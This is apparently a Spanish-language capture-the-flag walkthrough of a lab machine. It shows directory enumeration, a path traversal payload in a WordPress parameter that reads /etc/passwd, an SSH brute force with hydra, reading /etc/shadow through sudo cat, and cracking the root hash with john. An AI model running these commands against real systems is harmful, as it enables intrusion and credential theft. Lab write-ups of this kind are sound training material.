nmap: 80,22

--- 
hacemo un gobuster:

    gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt -k
    
y nos da un wordpress donde probamos en el buscador varios parámetros que nos da este comando:

       - wfuzz -c -u 172.18.0.2/wordpress/index.php?FUZZ=../../../../../../../../etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hl=40 --=115

   ---
   

        - http://172.18.0.2/wordpress/index.php?love=../../../../../../etc/passwd
        - que nos da la informacion root.
        - ahi nos da dos usuarios(rosa y pedro) y probamos con una fuerza bruta con los usuarios

fuerza bruta:

        - hydra ssh://172.18.0.2 -l rosa -P /usr/share/wordlists/rockyou.txt -t 64
    - nos da la contraseña: lovebug

ya dentro buscamos como escalar privilegios y aparece "cat" buscamos en: https://gtfobins.github.io/gtfobins/cat/  


colocamos el encontrado de esta forma:

           - sudo cat "/etc/shadow"  y nos muestra las contraseñas encriptadas.


tomamos los /etc/passwd y los shadow desde la terminal de rosa y los pasamos a la terminal nuestra. creamos un nano llamado shadow y otro passwords, luego pasamos a "unshadow passwd shadow > passwords", luego como las contraseña aparecen en formato de encriptacion ocupado el comando:  "john passwords --format=crypt" 
password es donde se guardo las cosas de contenidos de passwd y shadow de la terminal de rosa. luego de utilizar "john" nos da la contraseña de root: kittycat

colocamos en el terminal: su root / la contraseña: kittycat y somos root!. 
